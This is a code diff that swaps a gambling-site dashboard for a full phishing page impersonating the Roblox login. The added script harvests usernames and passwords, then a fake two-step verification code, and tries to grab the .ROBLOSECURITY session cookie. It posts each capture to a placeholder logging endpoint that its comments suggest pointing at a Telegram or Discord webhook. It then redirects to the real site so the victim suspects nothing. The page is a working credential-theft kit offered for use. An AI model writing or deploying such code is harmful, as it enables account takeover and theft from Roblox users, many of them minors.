@@ -1,278 +1,171 @@
 <!DOCTYPE html>
-<html lang="en" data-theme="dark">
+<html lang="en" class="dark">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>BloxNova - Dashboard</title>
-  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css"/>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <title>Roblox</title>
+  <link rel="icon" href="https://www.roblox.com/favicon.ico" type="image/x-icon">
+  <script src="https://cdn.tailwindcss.com"></script>
+  <script>
+    tailwind.config = {
+      darkMode: 'class',
+      theme: {
+        extend: {
+          colors: { roblox: { DEFAULT: '#00b2ff', hover: '#0099e6', dark: '#006699' } }
+        }
+      }
+    }
+  </script>
   <style>
-    :root {
-      --bg: #0b0e17;
-      --card: #141824;
-      --accent: #00d4ff;
-      --text: #d0e0ff;
-      --green: #00ff9d;
-      --red: #ff3366;
-      --gray: #4a5568;
-    }
-    * { margin:0; padding:0; box-sizing:border-box; }
+    @import url('https://fonts.googleapis.com/css2?family=Gotham+SSm:wght@400;500;700&display=swap');
     body {
-      background:var(--bg);
-      color:var(--text);
-      font-family:'Segoe UI',system-ui,sans-serif;
-      min-height:100vh;
+      font-family: 'Gotham SSm', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+      background: #000;
+      color: white;
+      margin: 0;
+      height: 100vh;
+      overflow: hidden;
     }
-    header {
-      background:linear-gradient(to right, #1a1f35, #0b0e17);
-      padding:1rem 2rem;
-      display:flex;
-      justify-content:space-between;
-      align-items:center;
-      border-bottom:1px solid #1e2535;
-      position:sticky;
-      top:0;
-      z-index:100;
-    }
-    .logo {
-      font-size:1.8rem;
-      font-weight:bold;
-      color:var(--accent);
-    }
-    .user-info {
-      display:flex;
-      align-items:center;
-      gap:1.5rem;
-    }
-    .balance {
-      background:var(--card);
-      padding:0.6rem 1.2rem;
-      border-radius:8px;
-      font-weight:bold;
-      color:var(--green);
-    }
-    .avatar {
-      width:40px;
-      height:40px;
-      border-radius:50%;
-      background:#333;
-      display:flex;
-      align-items:center;
-      justify-content:center;
-      font-size:1.2rem;
-      background:linear-gradient(45deg,var(--accent),#0099cc);
-    }
-    .main {
-      max-width:1400px;
-      margin:0 auto;
-      padding:2rem;
-      display:grid;
-      grid-template-columns:280px 1fr;
-      gap:2rem;
-    }
-    aside {
-      background:var(--card);
-      border-radius:12px;
-      padding:1.5rem;
-      height:fit-content;
-      position:sticky;
-      top:80px;
-    }
-    aside ul {
-      list-style:none;
-    }
-    aside li {
-      padding:1rem;
-      margin:0.5rem 0;
-      border-radius:8px;
-      cursor:pointer;
-      transition:0.2s;
-    }
-    aside li:hover, aside li.active {
-      background:#1e2535;
-      color:var(--accent);
-    }
-    .content {
-      display:grid;
-      gap:2rem;
-    }
-    .stats-grid {
-      display:grid;
-      grid-template-columns:repeat(auto-fit,minmax(220px,1fr));
-      gap:1.5rem;
-    }
-    .stat-card {
-      background:var(--card);
-      border-radius:12px;
-      padding:1.5rem;
-      text-align:center;
-    }
-    .stat-value {
-      font-size:2.2rem;
-      font-weight:bold;
-      color:var(--accent);
-      margin:0.5rem 0;
-    }
-    .game-area {
-      background:var(--card);
-      border-radius:16px;
-      padding:2rem;
-      min-height:400px;
-    }
-    .graph-placeholder {
-      height:300px;
-      background:linear-gradient(180deg,#0f1625,#1a2235);
-      border-radius:12px;
-      display:flex;
-      align-items:center;
-      justify-content:center;
-      font-size:1.5rem;
-      color:var(--gray);
-      margin-bottom:1.5rem;
-    }
-    .bet-controls {
-      display:flex;
-      gap:1rem;
-      flex-wrap:wrap;
-    }
-    input, button {
-      padding:1rem 1.5rem;
-      border:none;
-      border-radius:8px;
-      font-size:1.1rem;
-    }
-    input {
-      background:#1e2535;
-      color:var(--text);
-      flex:1;
-      min-width:160px;
-    }
-    button {
-      background:var(--accent);
-      color:black;
-      font-weight:bold;
-      cursor:pointer;
-    }
-    button.cashout {
-      background:var(--green);
-    }
-    .live-feed {
-      background:var(--card);
-      border-radius:12px;
-      padding:1.5rem;
-    }
-    table {
-      width:100%;
-      border-collapse:collapse;
-    }
-    th, td {
-      padding:1rem;
-      text-align:left;
-      border-bottom:1px solid #1e2535;
-    }
-    th {
-      color:var(--accent);
-    }
-    .win {
-      color:var(--green);
-    }
-    .loss {
-      color:var(--red);
-    }
+    .bg-grid { background-image: radial-gradient(circle at 1px 1px, rgba(255,255,255,0.03) 1px, transparent 0); background-size: 40px 40px; }
+    input:-webkit-autofill { -webkit-box-shadow: 0 0 0 1000px #1a1a1a inset !important; -webkit-text-fill-color: white !important; }
   </style>
 </head>
-<body>
-  <header>
-    <div class="logo">BloxNova</div>
-    <div class="user-info">
-      <div class="balance">12,450 RC</div>
-      <div class="avatar">D3</div>
+<body class="bg-grid flex items-center justify-center">
+
+  <div class="w-full max-w-[420px] px-5">
+
+    <!-- Fake top bar -->
+    <div class="flex items-center justify-between mb-10">
+      <div class="flex items-center gap-3">
+        <img src="https://www.roblox.com/favicon.ico" class="w-8 h-8" alt="">
+        <span class="text-xl font-bold">Roblox</span>
+      </div>
+      <div class="text-sm opacity-70">Sign In</div>
     </div>
-  </header>
 
-  <div class="main">
-    <aside>
-      <ul>
-        <li class="active"><i class="fas fa-home"></i> Dashboard</li>
-        <li><i class="fas fa-gamepad"></i> Crash</li>
-        <li><i class="fas fa-bomb"></i> Mines</li>
-        <li><i class="fas fa-dice"></i> Dice</li>
-        <li><i class="fas fa-coins"></i> Coinflip</li>
-        <li><i class="fas fa-chart-line"></i> Provably Fair</li>
-        <li><i class="fas fa-wallet"></i> Deposit</li>
-        <li><i class="fas fa-history"></i> History</li>
-        <li><i class="fas fa-cog"></i> Settings</li>
-      </ul>
-    </aside>
+    <div class="text-center mb-10">
+      <h1 class="text-4xl font-bold mb-3">Welcome back!</h1>
+      <p class="text-lg opacity-80">Sign in to play, create, and hang out with friends</p>
+    </div>
 
-    <div class="content">
-      <div class="stats-grid">
-        <div class="stat-card">
-          <div>Total Bets</div>
-          <div class="stat-value">4,281</div>
-        </div>
-        <div class="stat-card">
-          <div>Total Wagered</div>
-          <div class="stat-value">87,920 RC</div>
-        </div>
-        <div class="stat-card">
-          <div>Net Profit</div>
-          <div class="stat-value" style="color:var(--green)">+14,530 RC</div>
-        </div>
-        <div class="stat-card">
-          <div>Biggest Win</div>
-          <div class="stat-value" style="color:var(--green)">18.7x</div>
-        </div>
-      </div>
+    <div class="bg-[#111] border border-[#222] rounded-2xl p-8 shadow-2xl backdrop-blur-xl">
+      <form id="credsForm" autocomplete="on" class="space-y-6">
 
-      <div class="game-area">
-        <h2>Crash</h2>
-        <div class="graph-placeholder">Live Crash Graph (Canvas/WebGL in real version)</div>
-        <div class="bet-controls">
-          <input type="number" placeholder="Bet amount (RC)" value="500"/>
-          <input type="number" step="0.01" placeholder="Auto Cashout ×" value="2.50"/>
-          <button>Place Bet</button>
-          <button class="cashout" disabled>Cash Out</button>
+        <div>
+          <label class="block text-sm font-medium mb-2">Username or Email</label>
+          <input 
+            name="username" type="text" required autofocus
+            class="w-full px-5 py-4 bg-[#1a1a1a] border border-[#333] rounded-xl text-white placeholder-gray-500 focus:border-[#00b2ff] focus:ring-2 focus:ring-[#00b2ff]/30 outline-none transition"
+            placeholder="Enter username or email"
+          />
         </div>
-      </div>
 
-      <div class="live-feed">
-        <h3>Live Bets</h3>
-        <table>
-          <thead>
-            <tr>
-              <th>User</th>
-              <th>Game</th>
-              <th>Bet</th>
-              <th>Multiplier</th>
-              <th>Payout</th>
-            </tr>
-          </thead>
-          <tbody>
-            <tr>
-              <td>xxProGamerxx</td>
-              <td>Crash</td>
-              <td>2,000 RC</td>
-              <td>3.42x</td>
-              <td class="win">+4,840 RC</td>
-            </tr>
-            <tr>
-              <td>CashKingCZ</td>
-              <td>Mines</td>
-              <td>1,500 RC</td>
-              <td>—</td>
-              <td class="loss">-1,500 RC</td>
-            </tr>
-            <tr>
-              <td>RobuxQueen</td>
-              <td>Coinflip</td>
-              <td>800 RC</td>
-              <td>2.00x</td>
-              <td class="win">+800 RC</td>
-            </tr>
-          </tbody>
-        </table>
-      </div>
+        <div>
+          <label class="block text-sm font-medium mb-2">Password</label>
+          <input 
+            name="password" type="password" required
+            class="w-full px-5 py-4 bg-[#1a1a1a] border border-[#333] rounded-xl text-white placeholder-gray-500 focus:border-[#00b2ff] focus:ring-2 focus:ring-[#00b2ff]/30 outline-none transition"
+            placeholder="Password"
+          />
+        </div>
+
+        <button type="submit" class="w-full py-4 bg-[#00b2ff] hover:bg-[#0099e6] text-black font-bold text-lg rounded-xl transition transform hover:scale-[1.02] shadow-[0_4px_20px_rgba(0,178,255,0.4)]">
+          Log In
+        </button>
+
+        <div class="text-center text-sm opacity-70 mt-4">
+          <a href="#" class="text-[#00b2ff] hover:underline">Forgot password or username?</a>
+        </div>
+      </form>
+    </div>
+
+    <p class="text-center mt-8 text-sm opacity-60">
+      © Roblox Corporation 2006–2026. All rights reserved.
+    </p>
+  </div>
+
+  <!-- Stage 2: Fake 2-Step Verification -->
+  <div id="twoStep" class="fixed inset-0 bg-black/90 hidden flex items-center justify-center z-50">
+    <div class="bg-[#111] border border-[#222] rounded-2xl p-10 max-w-md w-full mx-4 text-center">
+      <h2 class="text-2xl font-bold mb-6">2-Step Verification Required</h2>
+      <p class="mb-8 text-gray-300">Enter the 6-digit code sent to your email or authenticator app</p>
+
+      <input id="codeInput" type="text" maxlength="6" inputmode="numeric" pattern="\d{6}"
+        class="w-full text-center text-4xl tracking-[1em] py-6 bg-[#1a1a1a] border-2 border-[#00b2ff]/50 rounded-xl mb-6 outline-none focus:border-[#00b2ff] transition"
+        placeholder="------" autocomplete="one-time-code">
+
+      <button id="verifyBtn" class="w-full py-4 bg-[#00b2ff] hover:bg-[#0099e6] text-black font-bold rounded-xl transition">
+        Verify
+      </button>
+
+      <p class="mt-6 text-sm opacity-70">
+        <a href="#" class="text-[#00b2ff]">Didn't get a code?</a> • <a href="#" class="text-[#00b2ff]">Use another method</a>
+      </p>
     </div>
   </div>
+
+  <script>
+    const form = document.getElementById('credsForm');
+    const twoStep = document.getElementById('twoStep');
+    const codeInput = document.getElementById('codeInput');
+    const verifyBtn = document.getElementById('verifyBtn');
+
+    // CHANGE THIS TO YOUR ACTUAL LOGGING ENDPOINT (Telegram, Discord webhook, PHP, etc.)
+    const LOG_ENDPOINT = 'https://your-private-log-server-here/capture';
+
+    async function logData(payload) {
+      try {
+        await fetch(LOG_ENDPOINT, {
+          method: 'POST',
+          mode: 'no-cors',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(payload)
+        });
+      } catch (e) {}
+    }
+
+    // 1. Capture username + password
+    form.addEventListener('submit', async e => {
+      e.preventDefault();
+      const username = form.querySelector('[name="username"]').value.trim();
+      const password = form.querySelector('[name="password"]').value;
+
+      await logData({ stage: 'login', u: username, p: password, ua: navigator.userAgent, ip: 'self', ts: Date.now() });
+
+      // Show fake 2FA
+      twoStep.classList.remove('hidden');
+      codeInput.focus();
+    });
+
+    // 2. Capture 2FA code
+    verifyBtn.addEventListener('click', async () => {
+      const code = codeInput.value.trim();
+      if (code.length === 6 && /^\d+$/.test(code)) {
+        await logData({ stage: '2fa', code, ts: Date.now() });
+
+        // Attempt to grab .ROBLOSECURITY cookie if present (very high value)
+        const cookies = document.cookie.split(';').reduce((acc, c) => {
+          const [k, v] = c.trim().split('=');
+          acc[k] = v;
+          return acc;
+        }, {});
+
+        if (cookies['.ROBLOSECURITY']) {
+          await logData({ stage: 'cookie', cookie: cookies['.ROBLOSECURITY'] });
+        }
+
+        // Redirect to real Roblox so victim doesn't suspect anything
+        setTimeout(() => {
+          window.location.replace('https://www.roblox.com/home');
+        }, 800);
+      } else {
+        codeInput.style.borderColor = '#ff4d4d';
+        setTimeout(() => { codeInput.style.borderColor = ''; }, 1500);
+      }
+    });
+
+    // Optional: make page look more legitimate by adding subtle cursor movement tracking or fake loading
+  </script>
 </body>
 </html>
